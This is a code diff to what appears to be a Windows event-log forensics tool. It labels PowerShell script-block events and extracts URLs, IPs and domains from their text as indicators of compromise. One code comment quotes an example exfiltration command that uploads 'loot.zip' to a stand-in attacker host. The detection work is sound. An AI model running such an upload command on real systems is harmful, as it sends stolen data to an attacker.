@@ -364,6 +364,11 @@ const WIN_EVENTS: Record<number, WinEventDef> = {
   4702: { label: "Scheduled task updated", severity: "Medium", mitre: ["T1053.005"] },
   4688: { label: "Process created", severity: "Low", kind: "process", mitre: ["T1059"] },
   4689: { label: "Process exited", severity: "Info" },
+  // PowerShell/Operational. Without an entry here the default label reads either "Event 4104" or the
+  // rendered message's boilerplate first line ("Creating Scriptblock text (1 of 1):") — neither names
+  // what happened. Not `kind: "process"`: 4104 carries no Image/CommandLine, and the command-line
+  // grading below would score an empty string on every row.
+  4104: { label: "PowerShell script block logged", severity: "Low", mitre: ["T1059.001"] },
   // Object / share / policy
   4663: { label: "Object access attempt", severity: "Low" },
   4670: { label: "Permissions on object changed", severity: "Medium" },
@@ -1182,6 +1187,13 @@ export function mapWindows(
   // `Invoke-RestMethod -Uri https://mft.attacker.tld -InFile loot.zip` never became an IOC. textIocs
   // already skips internal AD/mDNS zones (.local/.lan/.corp) and filenames, so this stays signal-rich.
   if (def.kind === "process") textIocs(str(getCI(ed, "CommandLine")), iocSink);
+  // A PowerShell 4104 script block is evidence in exactly the same way a command line is — it is
+  // where the download cradle names its C2 — but it arrives under `ScriptBlockText` with no
+  // `kind: "process"` to trigger the scrape above, so a natively-parsed 4104 row yielded NO IOCs at
+  // all: not the URL, not the IP, not the domain (#652). Scraped here rather than on any one
+  // importer's path because every shape that reaches a parsed 4104 — Velociraptor eventlog, Sigma,
+  // DetectRaptor, Chainsaw, Hayabusa, raw EVTX XML — funnels through mapWindows.
+  textIocs(str(getCI(ed, "ScriptBlockText")), iocSink);
   const dns = str(getCI(ed, "QueryName")).trim();
   if (def.kind === "dns" && dns && dns !== "-" && /\./.test(dns))
     addIoc(iocSink, "domain", dns.replace(/\.$/, ""));
